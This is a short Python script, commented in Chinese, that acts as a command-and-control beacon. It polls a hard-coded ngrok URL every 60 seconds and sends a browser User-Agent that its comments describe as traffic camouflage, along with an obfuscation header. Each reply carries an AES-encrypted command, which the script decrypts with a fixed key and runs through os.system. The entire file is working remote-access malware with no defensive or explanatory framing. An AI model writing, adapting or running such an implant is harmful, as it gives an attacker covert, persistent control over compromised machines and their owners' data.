import requests
import time
import os
from Crypto.Cipher import AES
import base64
import json
import string

# AES加密和解密函数
def decrypt(ciphertext, key):
    raw_data = base64.b64decode(ciphertext)
    nonce = raw_data[:16]
    cipher = AES.new(key, AES.MODE_EAX, nonce=nonce)
    plaintext = cipher.decrypt(raw_data[16:])
    return plaintext.decode()

def execute_command(command):
    os.system(command)

def main(c2_url, encryption_key):
    headers = {
        "User-Agent": "Mozilla/5.0",  # 流量伪装为常见浏览器
        "X-Custom-Protocol": "custom-protocol"  # 协议混淆
    }
    while True:
        try:
            response = requests.get(c2_url, headers=headers)
            if response.status_code == 200:
                data = json.loads(response.text)
                encrypted_command = data["payload"]
                command_with_padding = decrypt(encrypted_command, encryption_key)
                command = command_with_padding.split('<<<END>>>')[0]  # 使用特定分隔符解析命令
                execute_command(command)
        except Exception as e:
            print(f'Error connecting to C2 server: {e}')

        # 心跳间隔时间（例如，60秒）
        time.sleep(60)

if __name__ == '__main__':
    c2_url = 'https://9649-117-129-82-63.ngrok-free.app/index.html'  # 替换为Ngrok生成的公共URL
    encryption_key = b'0123456789abcdef'  # 16字节AES密钥
    main(c2_url, encryption_key)
